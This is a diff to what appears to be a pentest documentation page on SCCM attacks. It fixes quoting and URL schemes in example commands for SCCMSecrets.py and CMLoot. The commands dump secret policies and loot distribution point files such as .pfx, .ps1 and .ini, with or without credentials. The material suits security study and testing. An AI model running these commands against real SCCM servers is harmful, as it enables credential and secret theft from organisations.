@@ -69,7 +69,7 @@ To this end, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python
 python3 SCCMSecrets.py policies -mp "http://$MP_IP" -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"
 
 # HTTPS with client certificate
-python3 SCCMSecrets.py policies -mp https://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' --pki-cert ./cert.pem --pki-key ./key.pem
+python3 SCCMSecrets.py policies -mp https://$MP_IP -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn 'newdevice' --pki-cert ./cert.pem --pki-key ./key.pem
 ```
 
 Note that if you do not provide machine account credentials, `SCCMSecrets.py` will use the unauthenticated registration endpoint in order to attempt exploiting automatic device approval.
@@ -117,7 +117,7 @@ All secret policies associated with the compromised device's collections (includ
 python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/
 
 # HTTPS with client certificate authentication
-python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/ --pki-cert cert.pem --pki-key key.pem
+python3 SCCMSecrets.py policies -mp https://$MP_IP --use-existing-device compromised_device/ --pki-cert cert.pem --pki-key key.pem
 ```
 
 === Windows-based
@@ -201,13 +201,13 @@ Not providing any credentials will attempt to exploit anonymous access on the Di
 python3 SCCMSecrets.py files -dp http://$DP_IP
 
 # Downloads files with specific extensions 
-python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -H '$HASH' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
+python3 SCCMSecrets.py files -dp http://$DP_IP -u "$USER" -H "$HASH" --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
 
 # Having indexed files first, downloads specific files from the Distribution Point
-python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -p '$PASSWORD' --urls to_download.lst
+python3 SCCMSecrets.py files -dp http://$DP_IP -u "$USER" -p "$PASSWORD" --urls to_download.lst
 
 # Perform file dump attack via HTTPS and client certificate authentication
-python3 SCCMSecrets.py files -dp https://$DP_IP -u '$USER' -p '$PASSWORD' --pki-cert ./cert.pem --pki-key ./key.pem
+python3 SCCMSecrets.py files -dp https://$DP_IP -u "$USER" -p "$PASSWORD" --pki-cert ./cert.pem --pki-key ./key.pem
 ```
 
 If anonymous access is enabled on the Distribution Point, [sccm-http-looter](https://github.com/badsectorlabs/sccm-http-looter) (Golang) can also be used. It may be faster as it is written in Golang.
@@ -237,7 +237,7 @@ On Windows, [CMLoot](https://github.com/1njected/CMLoot) (Powershell) was the or
 
 ```powershell
 # Index available files
-Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
+Invoke-CMLootInventory -SCCMHost sccm01.$DOMAIN -Outfile sccmfiles.txt
 
 # Download a single file
 Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
